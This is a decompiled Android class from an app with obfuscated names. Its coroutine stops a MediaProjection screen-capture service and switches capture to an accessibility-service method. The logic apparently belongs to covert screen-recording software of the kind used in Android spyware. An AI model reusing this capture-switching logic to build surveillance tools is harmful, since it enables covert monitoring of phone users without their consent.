package com.storm.safe.rock.manager;

import com.storm.safe.rock.service.MediaDisplayService;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.SuspendLambda;
import p000.C1351vv;
import p000.InterfaceC0876mv;
import p000.InterfaceC0920no;
import p000.InterfaceC1116qn;
import p000.b81;
import p000.kg1;
import p000.l10;
import p000.t60;
import p000.u11;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
@InterfaceC1116qn(m214402c = "com.storm.safe.rock.manager.etzbzyzqxvqm$switchToAccessibilityMode$1", m214403f = "etzbzyzqxvqm.kt", m214404l = {212}, m214405m = "invokeSuspend")
/* loaded from: classes2.dex */
final class etzbzyzqxvqm$switchToAccessibilityMode$1 extends SuspendLambda implements l10 {

    /* renamed from: a1 */
    public int f52182a1;

    /* renamed from: a2 */
    public final /* synthetic */ C0263a5 f52183a2;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public etzbzyzqxvqm$switchToAccessibilityMode$1(C0263a5 c0263a5, InterfaceC0876mv interfaceC0876mv) {
        super(2, interfaceC0876mv);
        this.f52183a2 = c0263a5;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
        return new etzbzyzqxvqm$switchToAccessibilityMode$1(this.f52183a2, interfaceC0876mv);
    }

    @Override // p000.l10
    public final Object invoke(Object obj, Object obj2) {
        return ((etzbzyzqxvqm$switchToAccessibilityMode$1) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2)).invokeSuspend(C1351vv.f60710b1);
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final Object invokeSuspend(Object obj) throws Throwable {
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i = this.f52182a1;
        try {
            if (i == 0) {
                kg1.m213544f4(obj);
                u11 u11Var = this.f52183a2.f52155a4;
                if (u11Var != null) {
                    u11Var.m215253a7(null);
                }
                C0263a5 c0263a5 = this.f52183a2;
                c0263a5.f52155a4 = null;
                c0263a5.f52152a1 = false;
                this.f52183a2.f52153a2 = false;
                if (t60.m214686a2(this.f52183a2.f52154a3, "mediaprojection")) {
                    MediaDisplayService.f52303c1.stop(this.f52183a2.f52151a0);
                }
                this.f52183a2.f52154a3 = C0263a5.f52144b0.getCAPTURE_TECH_ACCESSIBILITY();
                this.f52182a1 = 1;
                if (b81.m210571b1(100L, this) == coroutineSingletons) {
                    return coroutineSingletons;
                }
            } else {
                if (i != 1) {
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                kg1.m213544f4(obj);
            }
            this.f52183a2.m211356b3();
        } catch (Exception e) {
            t60.m214705c6("etzbzyzqxvqm", "❌ 切换无障碍模式失败", e);
        }
        return C1351vv.f60710b1;
    }
}
